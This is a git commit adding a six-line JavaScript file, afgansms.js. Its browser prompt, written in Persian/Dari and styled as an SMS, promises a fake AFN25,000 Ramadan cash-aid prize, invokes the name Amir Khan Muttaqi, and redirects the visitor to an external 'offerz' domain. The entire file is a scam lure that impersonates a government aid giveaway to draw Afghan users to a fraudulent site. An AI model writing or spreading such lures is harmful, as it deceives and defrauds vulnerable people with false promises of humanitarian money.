87fa349bc0da7cb1b35c8486b183463be3534d1a
bigetijazz19 <bigetijazz19@gmail.com>
2025-03-25 18:07:33 +0100

    Create afgansms.js

---
+++ afgansms.js
@@ -0,0 +1,6 @@
+
+var password = 'دور شدن AFN25,000'
+password=prompt('SMS: تبریک باشه شما واجد شرایط هستید AMIR KHAN MUTTAQI AFN25,000 RAMADAN کمک نقدی برای همه، لطفاً OK را فشار دهید تا دور دور جایزه نقدی داشته باشید','دور شدن AFN25,000');
+if (password != 'دور شدن AFN25,000') {
+location.href='https://www.ntegha-offerz.xyz/ramadan-AFN25000';
+}
